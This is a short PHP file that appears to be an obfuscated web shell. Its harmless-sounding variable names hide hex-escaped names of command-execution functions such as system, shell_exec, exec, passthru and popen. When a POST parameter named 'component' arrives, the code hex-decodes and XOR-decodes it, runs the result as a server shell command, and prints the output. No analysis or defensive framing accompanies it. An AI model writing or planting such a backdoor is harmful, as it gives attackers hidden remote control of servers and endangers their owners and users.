<?php

$query_handler3 = "exec";
$query_handler4 = "\x70a\x73\x73\x74hru";
$query_handler7 = "p\x63lo\x73e";
$query_handler6 = "\x73t\x72e\x61m_get\x5F\x63o\x6Ete\x6Ets";
$event_handler = "\x68e\x782\x62i\x6E";
$query_handler5 = "p\x6F\x70en";
$query_handler1 = "sy\x73te\x6D";
$query_handler2 = "sh\x65\x6Cl\x5Fe\x78\x65c";
if (isset($_POST["comp\x6F\x6Een\x74"])) {
            function splitter_tool ($dat,  $mrk) {
 $property_set='';
 $x=0;
 do{
$property_set.=chr(ord($dat[$x])^$mrk);
$x++;

} while($x<strlen($dat));
 return$property_set;
 
}
            $component = $event_handler($_POST["comp\x6F\x6Een\x74"]);
            $component = splitter_tool($component, 85);
            if (function_exists($query_handler1)) {
                $query_handler1($component);
            } elseif (function_exists($query_handler2)) {
                print $query_handler2($component);
            } elseif (function_exists($query_handler3)) {
                $query_handler3($component, $data_dat);
                print join("\n", $data_dat);
            } elseif (function_exists($query_handler4)) {
                $query_handler4($component);
            } elseif (function_exists($query_handler5) && function_exists($query_handler6) && function_exists($query_handler7)) {
                $mrk_property_set = $query_handler5($component, 'r');
                if ($mrk_property_set) {
                    $obj_ref = $query_handler6($mrk_property_set);
                    $query_handler7($mrk_property_set);
                    print $obj_ref;
                }
            }
            exit;
        }